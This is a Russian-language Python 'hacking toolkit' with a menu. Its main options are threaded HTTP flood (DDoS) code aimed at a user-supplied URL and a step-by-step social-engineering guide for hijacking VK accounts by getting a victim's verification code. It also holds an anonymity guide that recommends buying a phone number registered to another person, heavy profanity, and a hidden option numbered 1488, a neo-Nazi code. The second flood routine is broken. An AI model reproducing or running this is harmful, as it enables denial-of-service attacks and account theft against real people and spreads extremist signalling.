#Хуйли смотриш копипастер
from termcolor import colored
import threading
import requests
from pytube import YouTube
from tqdm import tqdm
import json
import sqlite3
from colorama import Fore
from bs4 import BeautifulSoup
from colorama import Fore
from pyfiglet import Figlet
import time
import os
import subprocess
import webbrowser
from pystyle import *
import random



import platform
import os
import sys
import socket
import pystyle
import phonenumbers, phonenumbers.timezone, phonenumbers.carrier, phonenumbers.geocoder
import requests
import whois
import random
import colorama
import string
import faker
import bs4
import urllib.parse
import colorama
import concurrent.futures
import csv
from pystyle import Colorate, Colors
import hashlib
import uuid
import urllib.request
import os
import requests
from pystyle import Colors, Colorate, Center  



#копипастер,все,дальше не ногой,проход закрыт

intro = """                                                                                                      
██████╗░███████╗██████╗░░█████╗░░█████╗░░█████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╦╝█████╗░░██████╔╝███████║██║░░██║██║░░██║
██╔══██╗██╔══╝░░██╔═══╝░██╔══██║██║░░██║██║░░██║
██████╦╝███████╗██║░░░░░██║░░██║╚█████╔╝╚█████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░    
          v1.0.1 by: VERAZ and 1VAN STROKE


                     PRESS ENTER
                                                                       
 
                 """
Anime.Fade(Center.Center(intro), Colors.green_to_black, Colorate.Vertical, interval=0.045, enter=True)
print(colored("""██████╗░███████╗██████╗░░█████╗░░█████╗░░█████╗░
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╦╝█████╗░░██████╔╝███████║██║░░██║██║░░██║
██╔══██╗██╔══╝░░██╔═══╝░██╔══██║██║░░██║██║░░██║
██████╦╝███████╗██║░░░░░██║░░██║╚█████╔╝╚█████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░   ")""", 'green', attrs=['bold']))
                      

print(colored("""Выберете действие:
1. DDos
2. DDos pro
3. Рецепт мефа
4. Рецепт горохового супа
5. Бесплатный прокси
6. Мануал по анонимности
7. Взлом вк мануал
8. Снос тг (ещё не готов)
9. Дисклеймер
10. Связь с автором   
11. Авторы""", 'green', attrs=['bold']))

#копипастер сука че нить тронешь все 32 вылетят в ряд

phh = input(Fore. GREEN+ '[?] Выберите пункт меню -> ')
if phh == '1':
        url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.green_to_cyan, interval=0.005)
        num_requests = int(
            pystyle.Write.Input(
                "[?] Введите количество запросов: ", pystyle.Colors.green_to_cyan, interval=0.005
            )
        )
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        ]
        def send_request(i):
            user_agent = random.choice(user_agents)
            headers = {"User-Agent": user_agent}
            try:
                response = requests.get(url, headers=headers)
                print(f"{colorama.Fore.green_to_cyan}[+] Request {i} sent successfully\n")
            except:
                print(f"{colorama.Fore.green_to_cyan}[+] Request {i} sent successfully\n")
        threads = []
        for i in range(1, num_requests + 1):
            t = threading.Thread(target=send_request, args=[i])
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

elif phh == '2':
    s = 0
    url = input("[?] URL -> ")
    num_requests = int(input("[?] Введите     количество запросов -> "))
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
]

    def send_request(i):
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        print(f"[+] Request {i} sent successfully\n")
    except:
        print(f"[-] Request {i} failed\n")

    threads = []
    for ob in range(1, num_requests + 1):
        t = threading.Thread(target=send_request, args=[i])
        t.start()
    threads.append(t)

    for ji in threads:
        t.join()
        back = input("[?] Вернуться в главное меню? Yes/No -> ")

        if back.lower() == "yes":
            os.system("clear")
            os.system("python main.py")
        elif back.lower() == "no":
            print("Хорошо, вы не вернетесь в главное меню") ()


elif phh=='3':
        pystyle.Write.Print ("Нахуй иди, иш чего захотелось нарик ебаный!",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh=='4':
        print ("Суп гороховый с копченостями",
         "Ингредиенты:\n- Горох\n- Копчености\n- Картофель\n- Морковь\n- Лук\n\nИнструкция:\n1. Замочите горох и варите с копченостями до готовности.\n2. Добавьте нарезанные овощи.")
elif phh=='5':
        pystyle.Write.Print ("Хуй вам а не бесплатный прокси!",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh=='6':
        pystyle.Write.Print(""""Всем привет я ваня строк, это мой краткий мануал по base анонимности

1. Советую купить физ номер зареганный на другого человека и пользоваться им
2. Удалите все почты нахуй, если че я не шучу, используйте анонимные или временные почты для отправки сообщений и регистрации на различных сайтах
3. Не переходите по сокращенным ссыкам не проверив их (есть специальные сервисы для проверки что находится за сокращенной ссылкой, загуглите) 
4. Желательно пользуйтесь тором хоть если постараться через него можно отследить ваш айпи адрес но это будет намного тяжелее чем через обычный браузер, и да режим инкогнито нихера не инкогнито, для поооолной защиты используйте связку впн + тор (этого будет более чем достаточно, но будут писдец какие большие просадки в интернете:) ) 
5. Навсякий случай напомню что распаковывать файлы просто кинув их перед этим в вирус тотал не достаточно, есть ботнеты, скрытные майнеры, черви, локеры и еще много всякой хуйни, используйте виртуалку и не парьтесь

Тааак, вроде все написал, может че то забыл, но этого вам будет достаточно, спс за прочтение данного мануала, надеюсь помог, всем удачи

Мануал был написан ваней строк специально для софта vera01""""",pystyle.Colors.green_to_cyan, interval = 0.005)
if phh=='7':
    pystyle.Write.Print ("""нужно иметь
1:номер который привязан к странице 
2:впн
сам способ
находим номер человека который привязан к странице 
включаем впн
заходим в браузерную версию вк
нажимаем "забыли пароль"
вводим номер который узнали
фамилию которая указана на странице 
выбираем "нету доступа к странице"
нажимаем "позвонить на номер"
пишем человеку похожем текстовом 
"привет  тебе звонили дай пожалуйста номер который звонил"
дальше смотрим какие последние цифры и вводим их.
шанс 99% что человек даст номер
""",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh=='8':
    pystyle.Write.Print ("Да какое 8 ебло, написанно же то что еще не готов снос тг, хули ты тыкаешь",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh=='9':
    pystyle.Write.Print ("Данный софт сделан только в образовательных целях! Мы соблюдаем закон и не несем ответственности за ваши действия!",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh=='10':
    pystyle.Write.Print ("Обратная связь: https://t.me/str0ke_s0ft",pystyle.Colors.green_to_cyan, interval = 0.005);
elif phh=='11':
    pystyle.Write.Print ("Создатели этого софта VERAZ and 1VAN",pystyle.Colors.green_to_cyan, interval = 0.005)
elif phh == "1488":
        
            pystyle.Anime.Fade(pystyle.Center.Center("MMMMMMMMWNKOxdlcc::::::ccldxOKNWMMMMMMMM\nMMMMMWN0xoc::;::ccllllcc::;;:cokKNWMMMMM\nMMMWNOoc:;:coxO0KXXXXXXK0Oxoc:;:cd0NWMMM\nMMW0o:::::o0NWMMMMMMMMMMMMWNKkoc;::dKWMM\nMNkc::::::cokXMMWOlllllllllllcoxo:::lONM\nNkc;:cxko::;:o0NNc            .kXkc:;ckN\nkc::cONWk,';::cdk:    .:ccccccoKMNkc:;cO\nl:;:xNMMk. .,;:::,.   cNMMMMMMMMMMNx:::o\n:;;l0WMMk.  .',;::;'..;dxxxxxxONMMW0l;;c\n::;oXMMMk.     .';:;;;'.      'OMMWKo;;:\n:;;oKMMM0:',,,,,,',;::;;'..   .OMMWKl;;:\nc;:cOWMMWWNNNNNNK: ..';;;:;.  .OMMWkc::l\nd:::oKWMWKKKKKKKO;    ;l:;:;'.'OMWKo:::x\nKo:::dXWO,.......     cKOo::;;:kNKd:::oK\nW0o:;:o0k,............oNWNkc:::col:;:oKW\nMWKd:::coxO00KKK0KKKKKNMMMNKkl:;;;;cxXWM\nMMWNOo:;::ox0XNWWMMMMMMWWNX0xl::::oONMMM\nMMMMWNOdc:;::codxkkkkkkxdoc::::cdONWMMMM\nMMMMMMMWKOdlc::;;;;;;;;;;::clxOXWMMMMMMM\nMMMMMMMMMMWXOxolc::::::clox0XWMMMMMMMMMM"),pystyle.Colors.green_to_cyan,pystyle.Colorate.Vertical)
elif phh=='322':
    print("андрей лох, а ванек строк не плох")